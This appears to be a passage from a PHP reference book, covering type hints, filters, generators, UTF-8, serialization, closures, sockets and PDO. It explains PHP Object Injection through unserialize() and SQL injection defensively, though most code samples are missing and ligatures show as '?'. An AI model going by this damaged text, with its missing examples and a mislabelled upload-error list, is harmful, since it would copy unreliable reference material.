In PHP 7.1, functions can declare a nullable return type hint. However, the function must still return null, not void (no/empty return statements).


Section 45.4: Type hinting generic objects
Since PHP objects don't inherit from any base class (including stdClass), there is no support for type hinting a generic object type.

For example, the below will not work.


And will throw a fatal error:

Fatal error: Uncaught TypeError: Argument 1 passed to doSomething() must be an instance of object, instance of OperationOne given

A workaround to this is to declare a degenerate interface that de?nes no methods, and have all of your objects implement this interface.


Section 45.5: Type Hinting No Return(Void)
In PHP 7.1, the void return type was added. While PHP has no actual void value, it is generally understood across programming languages that a function that returns nothing is returning void. This should not be confused with returning null, as null is a value that can be returned.


Note that if you declare a void return, you cannot return any values or you will get a fatal error:


However, using return to exit the function is valid:


Chapter 46: Filters & Filter Functions
Parameter	Details
variable	Value to ?lter. Note that scalar values are converted to string internally before they are ?ltered.




?lter

The ID of the ?lter to apply. The Types of ?lters manual page lists the available ?lters.If omitted, FILTER_DEFAULT will be used, which is equivalent to FILTER_UNSAFE_RAW. This will result in no ?ltering taking place by default.


	



options

Associative array of options or bitwise disjunction of ?ags. If ?lter accepts options, ?ags can be provided in "?ags" ?eld of array. For the "callback" ?lter, callable type should be passed. The callback must accept one argument, the value to be ?ltered, and return the value after ?ltering/sanitizing it.


This extension ?lters data by either validating or sanitizing it. This is especially useful when the data source contains unknown (or foreign) data, like user supplied input. For example, this data may come from an HTML form.
Section 46.1: Validating Boolean Values


Section 46.2: Validating A Number Is A Float
Validates value as ?oat, and converts to ?oat on success.




Results


Section 46.3: Validate A MAC Address
Validates a value is a valid MAC address


Results:


Section 46.4: Sanitze Email Addresses
Remove all characters except letters, digits and !#$%&'*+-=?^_`{|}~@.[].




Results:


Section 46.5: Sanitize Integers
Remove all characters except digits, plus and minus sign.


Results:


Section 46.6: Sanitize URLs
Sanitze URLs

Remove all characters except letters, digits and $-_.+!*'(),{}|\^~[]`<>#%";/?:@&=



Results:


Section 46.7: Validate Email Address
When ?ltering an email address filter_var() will return the ?ltered data, in this case the email address, or false if a valid email address cannot be found:


Results:


This function doesn't validate not-latin characters. Internationalized domain name can be validated in their xn--
form.

Note that you cannot know if the email address is correct before sending an email to it. You may want to do some extra checks such as checking for a MX record, but this is not necessary. If you send a con?rmation email, don't forget to remove unused accounts after a short period.
Section 46.8: Validating A Value Is An Integer
When ?ltering a value that should be an integer filter_var() will return the ?ltered data, in this case the integer, or false if the value is not an integer. Floats are not integers:


Results:




If you are expecting only digits, you can use a regular expression:


If you convert this value into an integer, you don't have to do this check and so you can use filter_var.
Section 46.9: Validating An Integer Falls In A Range
When validating that an integer falls in a range the check includes the minimum and maximum bounds:


Results:


Section 46.10: Validate a URL
When ?ltering a URL filter_var() will return the ?ltered data, in this case the URL, or false if a valid URL cannot be found:

URL: example.com


Results:


URL: http://example.com


Results:


URL: http://www.example.com


Results:


URL: http://www.example.com/path/to/dir/


Results:


URL: http://www.example.com/path/to/dir/index.php




Results:


URL:  http://www.example.com/path/to/dir/index.php?test=y


Results:


Warning: You must check the protocol to protect you against an XSS attack:


Section 46.11: Sanitize Floats
Remove all characters except digits, +- and optionally .,eE.


Results:



With the FILTER_FLAG_ALLOW_THOUSAND option:


Results:


With the FILTER_FLAG_ALLOW_SCIENTIFIC option:




Results:


Section 46.12: Validate IP Addresses
Validates a value is a valid IP address


Results:


Validate an valid IPv4 IP address:


Results:


Validate an valid IPv6 IP address:


Results:


Validate an IP address is not in a private range:


Results:


Validate an IP address is not in a reserved range:


Results:


Section 46.13: Sanitize ?lters
we can use ?lters to sanitize our variable according to our need.

Example


above will remove the html tags from $string variable.

Chapter 47: Generators
Section 47.1: The Yield Keyword
A yield statement is similar to a return statement, except that instead of stopping execution of the function and returning, yield instead returns a Generator object and pauses execution of the generator function.

Here is an example of the range function, written as a generator:


You can see that this function returns a Generator object by inspecting the output of var_dump:

Yielding Values

The Generator object can then be iterated over like an array.


The above example will output:

Yielding Values with Keys

In addition to yielding values, you can also yield key/value pairs.


The above example will output:



Section 47.2: Reading a large ?le with a generator
One common use case for generators is reading a ?le from disk and iterating over its contents. Below is a class that allows you to iterate over a CSV ?le. The memory usage for this script is very predictable, and will not ?uctuate depending on the size of the CSV ?le.


Section 47.3: Why use a generator?
Generators are useful when you need to generate a large collection to later iterate over. They're a simpler alternative to creating a class that implements an Iterator, which is often overkill.
For example, consider the below function.


All this function does is generates an array that's ?lled with random numbers. To use it, we might do

randomNumbers(10), which will give us an array of 10 random numbers. What if we want to generate one million random numbers? randomNumbers(1000000) will do that for us, but at a cost of memory. One million integers stored in an array uses approximately 33 megabytes of memory.


This is due to the entire one million random numbers being generated and returned at once, rather than one at a time. Generators are an easy way to solve this issue.

Section 47.4: Using the send()-function to pass values to a generator
Generators are fast coded and in many cases a slim alternative to heavy iterator-implementations. With the fast implementation comes a little lack of control when a generator should stop generating or if it should generate something else. However this can be achieved with the usage of the send() function, enabling the requesting function to send parameters to the generator after every loop.

//Imagining accessing a large amount of data from a server, here is the generator for this:
function generateDataFromServerDemo()
{
    $indexCurrentRun = 0; //In this example in place of data from the server, I just send feedback every time a loop ran through.

$timeout = false; while (!$timeout)
{
         $timeout = yield $indexCurrentRun; // Values are passed to caller. The next time the generator is called, it will start at this statement. If send() is used, $timeout will take this value.
$indexCurrentRun++;
}

yield 'X of bytes are missing. </br>';
}

// Start using the generator
$generatorDataFromServer = generateDataFromServerDemo (); foreach($generatorDataFromServer as $numberOfRuns)
{
if ($numberOfRuns < 10)
{
echo $numberOfRuns . "</br>";
}
else
{
$generatorDataFromServer->send(true); //sending data to the generator
         echo $generatorDataFromServer->current(); //accessing the latest element (hinting how many bytes are still missing.
}
}

Resulting in this Output:



Chapter 48: UTF-8
Section 48.1: Input
You should verify every received string as being valid UTF-8 before you try to store it or use it anywhere. PHP's mb_check_encoding() does the trick, but you have to use it consistently. There's really no way around this, as malicious clients can submit data in whatever encoding they want.


If you're using HTML5 then you can ignore this last point. You want all data sent to you by browsers to be in UTF-8. The only reliable way to do this is to add the accept-charset attribute to all of your <form> tags like so:


Section 48.2: Output
If your application transmits text to other systems, they will also need to be informed of the character encoding. In PHP, you can use the default_charset option in php.ini, or manually issue the Content-Type MIME header yourself. This is the preferred method when targeting modern browsers.


If you are unable to set the response headers, then you can also set the encoding in an HTML document with HTML metadata.

HTML5

Older versions of HTML


Section 48.3: Data Storage and Access

This topic speci?cally talks about UTF-8 and considerations for using it with a database. If you want more information about using databases in PHP then checkout this topic.

Storing Data in a MySQL Database:

Specify the utf8mb4 character set on all tables and text columns in your database. This makes MySQL physically store and retrieve values encoded natively in UTF-8.

MySQL will implicitly use utf8mb4 encoding if a utf8mb4_* collation is speci?ed (without any explicit character set).

Older versions of MySQL (< 5.5.3) do not support utf8mb4 so you'll be forced to use utf8, which only supports a subset of Unicode characters.

Accessing Data in a MySQL Database:

In your application code (e.g. PHP), in whatever DB access method you use, you'll need to set the connection charset to utf8mb4. This way, MySQL does no conversion from its native UTF-8 when it hands data o? to your application and vice versa.
Some drivers provide their own mechanism for con?guring the connection character set, which both updates its own internal state and informs MySQL of the encoding to be used on the connection. This is usually the preferred approach.

For Example (The same consideration regarding utf8mb4/utf8 applies as above):

If you're using the PDO abstraction layer with PHP = 5.3.6, you can specify charset in the DSN:

If you're using mysqli, you can call set_charset():

If you're stuck with plain mysql but happen to be running PHP = 5.2.3, you can call mysql_set_charset.

If the database driver does not provide its own mechanism for setting the connection character set, you may have to issue a query to tell MySQL how your application expects data on the connection to be encoded: SET NAMES 'utf8mb4'.

Chapter 49: Unicode Support in PHP
Section 49.1: Converting Unicode characters to "\uxxxx" format using PHP
You can use the following code for going back and forward.


How to use:

Output:

Section 49.2: Converting Unicode characters to their numeric value and/or HTML entities using PHP
You can use the following code for going back and forward.


if (!function_exists('mb_ord')) {
function mb_ord($char, $encoding = 'UTF-8') { if ($encoding === 'UCS-4BE') {
list(, $ord) = (strlen($char) === 4) ? @unpack('N', $char) : @unpack('n', $char); return $ord;
} else {
return mb_ord(mb_convert_encoding($char, 'UCS-4BE', $encoding), 'UCS-4BE');
}
}
}

if (!function_exists('mb_htmlentities')) {
function mb_htmlentities($string, $hex = true, $encoding = 'UTF-8') {
return preg_replace_callback('/[\x{80}-\x{10FFFF}]/u', function ($match) use ($hex) { return sprintf($hex ? '&#x%X;' : '&#%d;', mb_ord($match[0]));
}, $string);
}
}

if (!function_exists('mb_html_entity_decode')) {
function mb_html_entity_decode($string, $flags = null, $encoding = 'UTF-8') {
return html_entity_decode($string, ($flags === NULL) ? ENT_COMPAT | ENT_HTML401 : $flags,
$encoding);
}
}


How to use :
echo "Get string from numeric DEC value\n"; var_dump(mb_chr(50319, 'UCS-4BE')); var_dump(mb_chr(271));

echo "\nGet string from numeric HEX value\n"; var_dump(mb_chr(0xC48F, 'UCS-4BE')); var_dump(mb_chr(0x010F));

echo "\nGet numeric value of character as DEC string\n"; var_dump(mb_ord('d', 'UCS-4BE')); var_dump(mb_ord('d'));

echo "\nGet numeric value of character as HEX string\n"; var_dump(dechex(mb_ord('d', 'UCS-4BE'))); var_dump(dechex(mb_ord('d')));

echo "\nEncode / decode to DEC based HTML entities\n"; var_dump(mb_htmlentities('tch  ', false)); var_dump(mb_html_entity_decode('tch&#252;&#223;'));

echo "\nEncode / decode to HEX based HTML entities\n"; var_dump(mb_htmlentities('tch  ')); var_dump(mb_html_entity_decode('tch&#xFC;&#xDF;'));

Output :



Section 49.3: Intl extention for Unicode support
Native string functions are mapped to single byte functions, they do not work well with Unicode. The extentions iconv and mbstring o?er some support for Unicode, while the Intl-extention o?ers full support. Intl is a wrapper for the facto de standard ICU library, see http://site.icu-project.org for detailed information that is not available on http://php.net/manual/en/book.intl.php . If you can not install the extention, have a look at an alternative implementation of Intl from the Symfony framework.
ICU o?ers full Internationalization of which Unicode is only a smaller part. You can do transcoding easily:


But, do not dismiss iconv just yet, consider:


Chapter 50: URLs
Section 50.1: Parsing a URL
To separate a URL into its individual components, use parse_url():


After executing the above, the contents of $parts would be:


You can also selectively return just one component of the url. To return just the querystring:


Any of the following constants are accepted: PHP_URL_SCHEME, PHP_URL_HOST, PHP_URL_PORT, PHP_URL_USER, PHP_URL_PASS, PHP_URL_PATH, PHP_URL_QUERY and PHP_URL_FRAGMENT.
To further parse a query string into key value pairs use parse_str():


After execution of the above, the $params array would be populated with the following:


Section 50.2: Build an URL-encoded query string from an array
The http_build_query() will create a query string from an array or object. These strings can be appended to a URL to create a GET request, or used in a POST request with, for example, cURL.


$queryString will have the following value:



http_build_query() will also work with multi-dimensional arrays:


$queryString will have this value:


which is the URL-encoded version of


Section 50.3: Redirecting to another URL
You can use the header() function to instruct the browser to redirect to a di?erent URL:


You can also redirect to a relative URL (this is not part of the o?cial HTTP speci?cation, but it does work in all browsers):


If headers have been sent, you can alternatively send a meta refresh HTML tag.

WARNING: The meta refresh tag relies on HTML being properly processed by the client, and some will not do this. In general, it only works in web browsers. Also, consider that if headers have been sent, you may have a bug and this should trigger an exception.
You may also print a link for users to click, for clients that ignore the meta refresh tag:




Chapter 51: How to break down an URL
As you code PHP you will most likely get your self in a position where you need to break down an URL into several pieces. There's obviously more than one way of doing it depending on your needs. This article will explain those ways for you so you can ?nd what works best for you.
Section 51.1: Using parse_url()

parse_url(): This function parses a URL and returns an associative array containing any of the various components of the URL that are present.



If you need the path separated you can use explode


If you need the last part of the section you can use end() like this:


If the URL contains GET vars you can retrieve those as well




If you wish to break down the query vars you can use parse_str() like this:


Section 51.2: Using explode()

explode(): Returns an array of strings, each of which is a substring of string formed by splitting it on boundaries formed by the string delimiter.

This function is pretty much straight forward.







[0]
=>
http:
[1]
=>

[2]
=>
example.com
[3]
=>
project
[4]
=>
controller
[5]
=>
action
[6]
=>
param1
[7]
=>
param2

You can retrieve the last part of the URL by doing this:


You can also navigate inside the array by using sizeof() in combination with a math operator like this:


Section 51.3: Using basename()

basename(): Given a string containing the path to a ?le or directory, this function will return the trailing name component.

This function will return only the last part of an URL




If your URL has more stu? to it and what you need is the dir name containing the ?le you can use it with dirname() like this:


Chapter 52: Object Serialization
Section 52.1: Serialize / Unserialize
serialize() returns a string containing a byte-stream representation of any value that can be stored in PHP.
unserialize() can use this string to recreate the original variable values.

To serialize an object


To Unserialize an object


Example


Section 52.2: The Serializable interface
Introduction

Classes that implement this interface no longer support   sleep() and   wakeup(). The method serialize is called whenever an instance needs to be serialized. This does not invoke   destruct() or has any other side e?ect unless programmed inside the method. When the data is unserialized the class is known and the appropriate unserialize() method is called as a constructor instead of calling
 construct(). If you need to execute the standard constructor you may do so in the method.


Basic usage




Chapter 53: Serialization
Parameter	Details
The value to be serialized. serialize() handles all types, except the resource-type. You can even serialize() arrays that contain references to itself. Circular references inside the array/object you are serializing will also be stored. Any other reference will be lost. When serializing objects, PHP will

value

attempt to call the member function  sleep() prior to serialization. This is to allow the object to do any last minute clean-up, etc. prior to being serialized. Likewise, when the object is restored using unserialize() the  wakeup() member function is called. Object's private members have the class name prepended to the member name; protected members have a '*' prepended to the member name.
These prepended values have null bytes on either side.


Section 53.1: Serialization of di?erent types
Generates a storable representation of a value.

This is useful for storing or passing PHP values around without losing their type and structure. To make the serialized string into a PHP value again, use unserialize().
Serializing a string
Serializing a double

Serializing a ?oat

Float get serialized as doubles.

Serializing an integer
Serializing a boolean

Serializing null


Serializing an array
Serializing an object

You can also serialize Objects.

When serializing objects, PHP will attempt to call the member function  sleep() prior to serialization. This is to allow the object to do any last minute clean-up, etc. prior to being serialized. Likewise, when the object is restored using unserialize() the  wakeup() member function is called.

Note that Closures cannot be serialized:

Section 53.2: Security Issues with unserialize
Using unserialize function to unserialize data from user input can be dangerous.

A Warning from php.net

Warning Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and json_encode()) if you need to pass serialized data to the user.

Possible Attacks

PHP Object Injection


PHP Object Injection

PHP Object Injection is an application level vulnerability that could allow an attacker to perform di?erent kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:

The application must have a class which implements a PHP magic method (such as  wakeup or  destruct) that can be used to carry out malicious attacks, or to start a "POP chain".
All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.

Example 1 - Path Traversal Attack

The example below shows a PHP class with an exploitable  destruct method:


In this example an attacker might be able to delete an arbitrary ?le via a Path Traversal attack, for e.g. requesting the following URL:



Example 2 - Code Injection attack

The example below shows a PHP class with an exploitable  wakeup method:


In this example an attacker might be able to perform a Code Injection attack by sending an HTTP request like this:


Where the cookie parameter "data" has been generated by the following script:


Chapter 54: Closure
Section 54.1: Basic usage of a closure
A closure is the PHP equivalent of an anonymous function, eg. a function that does not have a name. Even if that is technically not correct, the behavior of a closure remains the same as a function's, with a few extra features.
A closure is nothing but an object of the Closure class which is created by declaring a function without a name. For example:


Keep in mind that $myClosure is an instance of Closure so that you are aware of what you can truly do with it (cf. http://fr2.php.net/manual/en/class.closure.php )

The classic case you would need a Closure is when you have to give a callable to a function, for instance usort. Here is an example where an array is sorted by the number of siblings of each person:


Section 54.2: Using external variables
It is possible, inside a closure, to use an external variable with the special keyword use. For instance:




You can go further by creating "dynamic" closures. It is possible to create a function that returns a speci?c calculator, depending on the quantity you want to add. For example:


Section 54.3: Basic closure binding
As seen previously, a closure is nothing but an instance of the Closure class, and di?erent methods can be invoked on them. One of them is bindTo, which, given a closure, will return a new one that is bound to a given object. For example:


Section 54.4: Closure binding and scope
Let's consider this example:




Try to change the property visibility to either protected or private. You get a fatal error indicating that you do not have access to this property. Indeed, even if the closure has been bound to the object, the scope in which the closure is invoked is not the one needed to have that access. That is what the second argument of bindTo is for.
The only way for a property to be accessed if it's private is that it is accessed from a scope that allows it, ie. the class's scope. In the just previous code example, the scope has not been speci?ed, which means that the closure has been invoked in the same scope as the one used where the closure has been created. Let's change that:


As just said, if this second parameter is not used, the closure is invoked in the same context as the one used where the closure has been created. For example, a closure created inside a method's class which is invoked in an object context will have the same scope as the method's:




Section 54.5: Binding a closure for one call
Since PHP7, it is possible to bind a closure just for one call, thanks to the call method. For instance:


As opposed to the bindTo method, there is no scope to worry about. The scope used for this call is the same as the one used when accessing or invoking a property of $myInstance.
Section 54.6: Use closures to implement observer pattern
In general, an observer is a class with a speci?c method being called when an action on the observed object occurs. In certain situations, closures can be enough to implement the observer design pattern.
Here is a detailed example of such an implementation. Let's ?rst declare a class whose purpose is to notify observers when its property is changed.




Then, let's declare the class that will represent the di?erent observers.


Let's ?nally test this:




Note that this example works because the observers share the same nature (they are both "named observers.")

Chapter 55: Reading Request Data
Section 55.1: Reading raw POST data
Usually data sent in a POST request is structured key/value pairs with a MIME type of application/x-www-form- urlencoded. However many applications such as web services require raw data, often in XML or JSON format, to be sent instead. This data can be read using one of two methods.

php://input is a stream that provides access to the raw request body.

Version < 5.6

$HTTP_RAW_POST_DATA is a global variable that contains the raw POST data. It is only available if the
always_populate_raw_post_data directive in php.ini is enabled.


This variable has been deprecated since PHP version 5.6, and was removed in PHP 7.0.

Note that neither of these methods are available when the content type is set to multipart/form-data, which is used for ?le uploads.
Section 55.2: Reading POST data
Data from a POST request is stored in the superglobal $_POST in the form of an associative array.

Note that accessing a non-existent array item generates a notice, so existence should always be checked with the
isset() or empty() functions, or the null coalesce operator. Example:

Version = 7.0


Section 55.3: Reading GET data
Data from a GET request is stored in the superglobal $_GET in the form of an associative array.

Note that accessing a non-existent array item generates a notice, so existence should always be checked with the
isset() or empty() functions, or the null coalesce operator.

Example: (for URL /topics.php?author=alice&topic=php)


Version = 7.0


Section 55.4: Handling ?le upload errors
The $_FILES["FILE_NAME"]['error'] (where "FILE_NAME" is the value of the name attribute of the ?le input, present in your form) might contain one of the following values:

1. UPLOAD_ERR_OK - There is no error, the ?le uploaded with success.
2. UPLOAD_ERR_INI_SIZE - The uploaded ?le exceeds the upload_max_?lesize directive in php.ini.
3. UPLOAD_ERR_PARTIAL - The uploaded ?le exceeds the MAX_FILE_SIZE directive that was speci?ed in the HTML form.
4. UPLOAD_ERR_NO_FILE - No ?le was uploaded.
5. UPLOAD_ERR_NO_TMP_DIR - Missing a temporary folder. (From PHP 5.0.3).
6. UPLOAD_ERR_CANT_WRITE - Failed to write ?le to disk. (From PHP 5.1.0).
7. UPLOAD_ERR_EXTENSION - A PHP extension stopped the ?le upload. (From PHP 5.2.0).

An basic way to check for the errors, is as follows:


Section 55.5: Passing arrays by POST
Usually, an HTML form element submitted to PHP results in a single value. For example:




This results in the following output:


However, there may be cases where you want to pass an array of values. This can be done by adding a PHP-like su?x to the name of the HTML elements:


This results in the following output:


You can also specify the array indices, as either numbers or strings:


Which returns this output:


This technique can be used to avoid post-processing loops over the $_POST array, making your code leaner and more concise.
Section 55.6: Uploading ?les with HTTP PUT
PHP provides support for the HTTP PUT method used by some clients to store ?les on a server. PUT requests are much simpler than a ?le upload using POST requests and they look something like this:


Into your PHP code you would then do something like this:


Also here you can read interesting SO question/answers about receiving ?le via HTTP PUT.

Chapter 56: Type juggling and Non-Strict Comparison Issues
Section 56.1: What is Type Juggling?
PHP is a loosely typed language. This means that, by default, it doesn't require operands in an expression to be of the same (or compatible) types. For example, you can append a number to a string and expect it to work.


The output will be:

string(24) "This is example number 1"


PHP accomplishes this by automatically casting incompatible variable types into types that allow the requested operation to take place. In the case above, it will cast the integer literal 1 into a string, meaning that it can be concatenated onto the preceding string literal. This is referred to as type juggling. This is a very powerful feature of PHP, but it is also a feature that can lead you to a lot of hair-pulling if you are not aware of it, and can even lead to security problems.
Consider the following:


The intent appears to be that the programmer is checking that a variable has a value of 1. But what happens if
$variable has a value of "1 and a half" instead? The answer might surprise you.


The result is:

bool(true)


Why has this happened? It's because PHP realised that the string "1 and a half" isn't an integer, but it needs to be in order to compare it to integer 1. Instead of failing, PHP initiates type juggling and, attempts to convert the variable into an integer. It does this by taking all the characters at the start of the string that can be cast to integer and casting them. It stops as soon as it encounters a character that can't be treated as a number. Therefore "1 and a half" gets cast to integer 1.
Granted, this is a very contrived example, but it serves to demonstrate the issue. The next few examples will cover some cases where I've run into errors caused by type juggling that happened in real software.
Section 56.2: Reading from a ?le
When reading from a ?le, we want to be able to know when we've reached the end of that ?le. Knowing that
fgets() returns false at the end of the ?le, we might use this as the condition for a loop. However, if the data

returned from the last read happens to be something that evaluates as boolean false, it can cause our ?le read loop to terminate prematurely.


If the ?le being read contains a blank line, the while loop will be terminated at that point, because the empty string evaluates as boolean false.
Instead, we can check for the boolean false value explicitly, using strict equality operators:


Note this is a contrived example; in real life we would use the following loop:


Or replace the whole thing with:


Section 56.3: Switch surprises
Switch statements use non-strict comparison to determine matches. This can lead to some nasty surprises. For example, consider the following statement:


This is a very simple statement, and works as expected when $name is a string, but can cause problems otherwise. For example, if $name is integer 0, then type-juggling will happen during the comparison. However, it's the literal

value in the case statement that gets juggled, not the condition in the switch statement. The string "input 1" is converted to integer 0 which matches the input value of integer 0. The upshot of this is if you provide a value of integer 0, the ?rst case always executes.

There are a few solutions to this problem:

Explicit casting

The value can be typecast to a string before comparison:


Or a function known to return a string can also be used:


Both of these methods ensure the value is of the same type as the value in the case statements.

Avoid switch

Using an if statement will provide us with control over how the comparison is done, allowing us to use strict comparison operators:


Section 56.4: Strict typing
Since PHP 7.0, some of the harmful e?ects of type juggling can be mitigated with strict typing. By including this declare statement as the ?rst line of the ?le, PHP will enforce parameter type declarations and return type declarations by throwing a TypeError exception.


For example, this code, using parameter type de?nitions, will throw a catchable exception of type TypeError when run:


Likewise, this code uses a return type declaration; it will also throw an exception if it tries to return anything other

than an integer:


Chapter 57: Sockets
Section 57.1: TCP client socket
Creating a socket that uses the TCP (Transmission Control Protocol)

Make sure the socket is successfully created. The onSocketFailure function comes from Handling socket errors example in this topic.

Connect the socket to a speci?ed address

The second line fails gracefully if connection failed.

Sending data to the server

The socket_write function sends bytes through a socket. In PHP, a byte array is represented by a string, which is normally encoding-insensitive.

Receiving data from the server

The following snippet receives some data from the server using the socket_read function.

Passing PHP_NORMAL_READ as the third parameter reads until a \r/\n byte, and this byte is included in the return value.

Passing PHP_BINARY_READ, on the contrary, reads the required amount of data from the stream.

If socket_set_nonblock was called in prior, and PHP_BINARY_READ is used, socket_read will return false immediately. Otherwise, the method blocks until enough data (to reach the length in the second parameter, or to reach a line ending) are received, or the socket is closed.
This example reads data from a supposedly IRC server.

Closing the socket

Closing the socket frees the socket and its associated resources.



Section 57.2: TCP server socket
Socket creation

Create a socket that uses the TCP. It is the same as creating a client socket.

Socket binding

Bind connections from a given network (parameter 2) for a speci?c port (parameter 3) to the socket. The second parameter is usually "0.0.0.0", which accepts connection from all networks. It can also
One common cause of errors from socket_bind is that the address speci?ed is already bound to another process. Other processes are usually killed (usually manually to prevent accidentally killing critical processes) so that the sockets would be freed.

Set a socket to listening

Make the socket listen to incoming connections using socket_listen. The second parameter is the maximum number of connections to allow queuing before they are accepted.

Handling connection

A TCP server is actually a server that handles child connections. socket_accept creates a new child connection.


Data transferring for a connection from socket_accept is the same as that for a TCP client socket.

When this connection should be closed, call socket_close($conn); directly. This will not a?ect the original TCP server socket.

Closing the server

On the other hand, socket_close($socket); should be called when the server is no longer used. This will free the TCP address as well, allowing other processes to bind to the address.
Section 57.3: UDP server socket
A UDP (user datagram protocol) server, unlike TCP, is not stream-based. It is packet-based, i.e. a client sends data in units called "packets" to the server, and the client identi?es clients by their address. There is no builtin function that relates di?erent packets sent from the same client (unlike TCP, where data from the same client are handled by a speci?c resource created by socket_accept). It can be thought as a new TCP connection is accepted and closed every time a UDP packet arrives.

Creating a UDP server socket
Binding a socket to an address

The parameters are same as that for a TCP server.

Sending a packet

This line sends $data in a UDP packet to $address:$port.

Receiving a packet

The following snippet attempts to manage UDP packets in a client-indexed manner.

Closing the server

socket_close can be used on the UDP server socket resource. This will free the UDP address, allowing other processes to bind to this address.
Section 57.4: Handling socket errors
socket_last_error can be used to get the error ID of the last error from the sockets extension.

socket_strerror can be used to convert the ID to human-readable strings.


Chapter 58: PDO
The PDO (PHP Data Objects) extension allows developers to connect to numerous di?erent types of databases and execute queries against them in a uniform, object oriented manner.

Section 58.1: Preventing SQL injection with Parameterized Queries
SQL injection is a kind of attack that allows a malicious user to modify the SQL query, adding unwanted commands to it. For example, the following code is vulnerable:


This allows any user of this script to modify our database basically at will. For example consider the following query string:


This makes our example query look like this


While this is an extreme example (most SQL injection attacks do not aim to delete data, nor do most PHP query execution functions support multi-query), this is an example of how a SQL injection attack can be made possible by the careless assembly of the query. Unfortunately, attacks like this are very common, and are highly e?ective due to coders who fail to take proper precautions to protect their data.
To prevent SQL injection from occurring, prepared statements are the recommended solution. Instead of concatenating user data directly to the query, a placeholder is used instead. The data is then sent separately, which means there is no chance of the SQL engine confusing user data for a set of instructions.

While the topic here is PDO, please note that the PHP MySQLi extension also supports prepared statements

PDO supports two kinds of placeholders (placeholders cannot be used for column or table names, only values):

1. Named placeholders. A colon(:), followed by a distinct name (eg. :user)


2. Traditional SQL positional placeholders, represented as ?:




If ever you need to dynamically change table or column names, know that this is at your own security risks and a bad practice. Though, it can be done by string concatenation. One way to improve security of such queries is to set a table of allowed values and compare the value you want to concatenate to this table.
Be aware that it is important to set connection charset through DSN only, otherwise your application could be prone to an obscure vulnerability if some odd encoding is used. For PDO versions prior to 5.3.6 setting charset through DSN is not available and thus the only option is to set PDO::ATTR_EMULATE_PREPARES attribute to false on the connection right after it's created.


This causes PDO to use the underlying DBMS's native prepared statements instead of just emulating it.

However, be aware that PDO will silently fallback to emulating statements that MySQL cannot prepare natively: those that it can are listed in the manual (source).
Section 58.2: Basic PDO Connection and Retrieval
Since PHP 5.0, PDO has been available as a database access layer. It is database agnostic, and so the following connection example code should work for any of its supported databases simply by changing the DSN.

// First, create the database handle

//Using MySQL (connection via local socket):
$dsn = "mysql:host=localhost;dbname=testdb;charset=utf8";

//Using MySQL (connection via network, optionally you can specify the port too):
//$dsn = "mysql:host=127.0.0.1;port=3306;dbname=testdb;charset=utf8";

//Or Postgres
//$dsn = "pgsql:host=localhost;port=5432;dbname=testdb;";

//Or even SQLite
//$dsn = "sqlite:/path/to/database"

$username = "user";
$password = "pass";
$db = new PDO($dsn, $username, $password);

// setup PDO to throw an exception if an invalid query is provided
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// Next, let's prepare a statement for execution, with a single placeholder
$query = "SELECT * FROM users WHERE class = ?";
$statement = $db->prepare($query);

// Create some parameters to fill the placeholders, and execute the statement
$parameters = [ "221B" ];
$statement->execute($parameters);

// Now, loop through each record as an associative array
while ($row = $statement->fetch(PDO::FETCH_ASSOC)) { do_stuff($row);
}

The prepare function creates a PDOStatement object from the query string. The execution of the query and retrieval of the results are performed on this returned object. In case of a failure, the function either returns false or throws an exception (depending upon how the PDO connection was con?gured).
Section 58.3: Database Transactions with PDO
Database transactions ensure that a set of data changes will only be made permanent if every statement is successful. Any query or code failure during a transaction can be caught and you then have the option to roll back the attempted changes.
PDO provides simple methods for beginning, committing, and rollbacking back transactions.


During a transaction any data changes made are only visible to the active connection. SELECT statements will return the altered changes even if they are not yet committed to the database.

Note: See database vendor documentation for details about transaction support. Some systems do not support transactions at all. Some support nested transactions while others do not.

Practical Example Using Transactions with PDO

In the following section is demonstrated a practical real world example where the use of transactions ensures the consistency of database.
Imagine the following scenario, let's say you are building a shopping cart for an e-commerce website and you decided to keep the orders in two database tables. One named orders with the ?elds order_id, name, address, telephone and created_at. And a second one named orders_products with the ?elds order_id, product_id and quantity. The ?rst table contains the metadata of the order while the second one the actual products that have been ordered.

Inserting a new order to the database

To insert a new order into the database you need to do two things. First you need to INSERT a new record inside the

orders table that will contain the metadata of the order (name, address, etc). And then you need to INSERT one record into the orders_products table, for each one of the products that are included in the order.
You could do this by doing something similar to the following:

// Insert the metadata of the order into the database
$preparedStatement = $db->prepare(
'INSERT INTO `orders` (`name`, `address`, `telephone`, `created_at`) VALUES (:name, :address, :telephone, :created_at)'
);

$preparedStatement->execute([ 'name' => $name, 'address' => $address,
'telephone' => $telephone, 'created_at' => time(),
]);

// Get the generated `order_id`
$orderId = $db->lastInsertId();

// Construct the query for inserting the products of the order
$insertProductsQuery = 'INSERT INTO `orders_products` (`order_id`, `product_id`, `quantity`) VALUES';

$count = 0;
foreach ( $products as $productId => $quantity ) {
$insertProductsQuery .= ' (:order_id' . $count . ', :product_id' . $count . ', :quantity' .
$count . ')';

$insertProductsParams['order_id' . $count] = $orderId;
$insertProductsParams['product_id' . $count] = $productId;
$insertProductsParams['quantity' . $count] = $quantity;

++$count;
}

// Insert the products included in the order into the database
$preparedStatement = $db->prepare($insertProductsQuery);
$preparedStatement->execute($insertProductsParams);

This will work great for inserting a new order into the database, until something unexpected happens and for some reason the second INSERT query fails. If that happens you will end up with a new order inside the orders table, which will have no products associated to it. Fortunately, the ?x is very simple, all you have to do is to make the queries in the form of a single database transaction.
Inserting a new order into the database with a transaction

To start a transaction using PDO all you have to do is to call the beginTransaction method before you execute any queries to your database. Then you make any changes you want to your data by executing INSERT and / or UPDATE queries. And ?nally you call the commit method of the PDO object to make the changes permanent. Until you call the commit method every change you have done to your data up to this point is not yet permanent, and can be easily reverted by simply calling the rollback method of the PDO object.

On the following example is demonstrated the use of transactions for inserting a new order into the database, while ensuring the same time the consistency of the data. If one of the two queries fails all the changes will be reverted.

